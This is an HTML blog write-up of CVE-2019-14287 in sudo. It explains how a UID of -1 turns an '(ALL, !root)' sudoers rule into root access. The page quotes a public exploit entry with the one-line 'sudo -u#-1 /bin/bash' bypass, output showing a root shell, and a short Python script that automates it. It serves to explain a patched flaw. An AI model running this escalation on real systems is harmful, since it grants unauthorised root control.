<!DOCTYPE html>
<html lang="en-us">
    <head>
		<title>BLOGS &middot; CVE-2019-14287</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="assets/css/main.css" />
        <noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
    </head>
    <body>
<!-- Generic -->

			<article class="container box style3">
				<header>
					<h2>Vulnerability Deep Dive Series: CVE-2019-14287</h2><br>
					<p>Giving superpowers to unprivileged users</p>
				</header>
				<section>
                    <!--
					<header>
						<h3>Paragraph</h3>
						<p>This is a subtitle</p>
                    </header>
                    -->
					<p>
                        <b>sudo</b> is a program for Unix-like operating systems that allows users to run programs with the security privileges of
                        another user, by default the <b>superuser</b>. It originally stood for "superuser do" as the older versions of sudo were designed
                        to run commands only as the superuser. However, the later version of sudo program also support for running commands not only as the
                        superuser but also as other restricted users, and thus it is also commonly expanded as "substitue user do".
                        sudo allows a permitted user to execute a command as another user, according to specifications in the <b><code>/etc/sudoers</code></b> file.
                        The real and effective <b>uid</b> and <b>gid</b> of the issuing user are then set to match those of the target user account as specified in the passwd file.
                        sudo is basically is a core command system that is pre-installed on macOS and UNIX or Linux-based operating systems.
                        Thus, it is a very important part of the operating system. This vulnerability allows non-privileged Linux and macOS users to run commands as root.
					</p>
					<a href="#" class="image fit"><img src="images/sudo.png" alt="" /></a>
					<br/>
					<p>
						Debian gave this bug a NVD severity of high This vulnerability affects systems with sudo version below 1.8.28. In the file lib/util/strtoid.c,
						they do a conversion from signed 64 bit to unsigned 32 bit. During this conversion, an overflow error gets introduced. The error results in the value
						0xFFFFFFFF to be ignored in the system.
					</p>
				</section>
				<section>
					<header>
						<h3>Understanding the Criticality</h3>
					</header>
					<p>
						Understanding why this vulnerability is considered to be a high severity according to Debian requires an understanding of why we use the sudoers file.
						The sudoers file is used to restrict certain actions that people who have sudo permission can do. This setup is common among most enterprise linux configurations.
						For example a typical school linux server would have an administrator who has full root control of the entire server, but some professors might have some sudo permissions
						to configure tools for their own class. The way an admin might want to setup this up would be to only allow the professors to run tools like pip package manager which requires
						sudo permissions at times. But however the professor should not be able to run commands like sudo rm -rf/* no preserve root. All of this setup is done in a file known
            /etc/sudoers.d or /etc/sudoers.
					</p>
				<section>
        <section>
          <header>
            <h3>Finding and locating the Vulnerability</h3>
          </header>
          <p>
            The way the sudoers file is setup is designed so that we give the user a right to execute some sort of limited sudo. The key here is that the vulnerable user has to be given
            access to run their command as any arbitrary user. This is where the <b>“ALL”</b> keyword comes into play. If we have <b>“ALL”</b> for our user in our visudo file, then we will be able to
            run the designated command as root even if inside the file we are specifically don’t we aren’t allowed to. The reason that we need the “ALL” is that if, for instance, instead
            of “ (ALL, !root) ALL” we had “(!root) ALL”, then our exploit would not work. This is because in the system calls that sudo uses setreuid and setresuid to change privilege and
            users; they will actually return as root for sudo to run the function as. So, we need the <b>“ALL”</b> to let us run the command as any arbitrary user (in our case root) in order for our
            exploit to work, otherwise the visudo file will still blocked our attempt at running the command and say we are not allowed to run the command.
          </p>
					<header>
						<h3>Exploit Code</h3>
					</header>
					<blockquote><div class="card">

						<div class="card-body">


							<pre><code class="language-py" style="white-space: pre-wrap;">
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.2.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287

'''Check for the user sudo permissions

sudo -l

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash

So user hacker can't run /bin/bash as root (!root)
User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash
With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT:

sudo -u#-1 /bin/bash

Example :

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id and /bin/bash is executed with root permission

Proof of Concept Code :

How to use :
python3 sudo_exploit.py

#!/usr/bin/python3
import os

#Get current username
username = input("Enter current username :")

#check which binary the user can run with sudo
os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
binary_file = open("binary")
binary= binary_file.read()

#execute sudo exploit
print("Lets hope it works")
os.system("sudo -u#-1 "+ binary)

                    </code></pre>

                    </div>
                    </blockquote>
				</section>
				<section>
					<header>
						<h3>Theoretical Explanation</h3>
					</header>
					<p>Theoretically, In practice, with vulnerable versions of Sudo you can get around this restriction to execute the programs as root anyway, which is obviously great for privilege escalation!
            With the above configuration, using sudo -u#0 "command" (the UID of root is always 0) would not work, as we're not allowed to execute commands as root. If we try to execute
            commands as user 0 we will be given an error.</p>
					<p>Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by
            specifying a UID of -1 or 4294967295, you can execute a command as root, despite being explicitly prevented from doing so. It is worth noting that this will only work if you've
            been granted non-root sudo permissions for the command, as in the configuration above.</p>
				</section>
				<section>
					<header>
						<h3>References</h3>
					</header>
					<ul>
						<li><a href=https://www.sudo.ws/alerts/minus_1_uid.html>https://www.sudo.ws/alerts/minus_1_uid.html</a></li>
						<li><a href=https://security-tracker.debian.org/tracker/CVE-2019-14287>https://security-tracker.debian.org/tracker/CVE-2019-14287</a></li>
						<li><a href=https://programmer.ink/think/cve-2019-14287-linux-sudo-vulnerability-analysis.html>https://programmer.ink/think/cve-2019-14287-linux-sudo-vulnerability-analysis.html</a></li>
						<li><a href=https://www.exploit-db.com/exploits/47502>https://www.exploit-db.com/exploits/47502</a></li>
					</ul>
				</section>
        <!--
				<section>
					<header>
						<h3>Ordered List</h3>
					</header>
					<ol>
						<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
						<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
						<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
						<li>Donec consectetur vestibulum dolor et pulvinar. Etiam vel felis enim, at viverra ligula. Ut porttitor sagittis lorem, quis eleifend nisi ornare vel.</li>
					</ol>
                </section>
              -->
                <!--
				<section>
					<header>
						<h3>Table</h3>
					</header>
					<div class="table-wrapper">
						<table>
							<thead>
								<tr>
									<th>ID</th>
									<th>Name</th>
									<th>Description</th>
									<th>Price</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>45815</td>
									<td>Something</td>
									<td>Ut porttitor sagittis lorem quis nisi ornare.</td>
									<td>29.99</td>
								</tr>
								<tr>
									<td>24524</td>
									<td>Nothing</td>
									<td>Ut porttitor sagittis lorem quis nisi ornare.</td>
									<td>19.99</td>
								</tr>
								<tr>
									<td>45815</td>
									<td>Something</td>
									<td>Ut porttitor sagittis lorem quis nisi ornare.</td>
									<td>29.99</td>
								</tr>
								<tr>
									<td>24524</td>
									<td>Nothing</td>
									<td>Ut porttitor sagittis lorem quis nisi ornare.</td>
									<td>19.99</td>
								</tr>
							</tbody>
							<tfoot>
								<tr>
									<td colspan="3"></td>
									<td>100.00</td>
								</tr>
							</tfoot>
						</table>
					</div>
                </section> -->
                <!--
				<section>
					<header>
						<h3>Form</h3>
					</header>
					<form method="post" action="#">
						<div class="row">
							<div class="col-6 col-12-mobile">
								<input class="text" type="text" name="name" id="name" value="" placeholder="John Doe" />
							</div>
							<div class="col-6 col-12-mobile">
								<input class="text" type="text" name="email" id="email" value="" placeholder="johndoe@domain.tld" />
							</div>
							<div class="col-12">
								<select name="department" id="department">
									<option value="">Choose a department</option>
									<option value="1">Manufacturing</option>
									<option value="2">Administration</option>
									<option value="3">Support</option>
								</select>
							</div>
							<div class="col-12">
								<input class="text" type="text" name="subject" id="subject" value="" placeholder="Enter your subject" />
							</div>
							<div class="col-12">
								<textarea name="message" id="message" placeholder="Enter your message"></textarea>
							</div>
							<div class="col-12">
								<ul class="actions">
									<li><input type="submit" value="Submit" /></li>
									<li><input type="reset" class="style3" value="Clear Form" /></li>
								</ul>
							</div>
						</div>
					</form>
				</section> -->
            </article>
    </body>
</html>
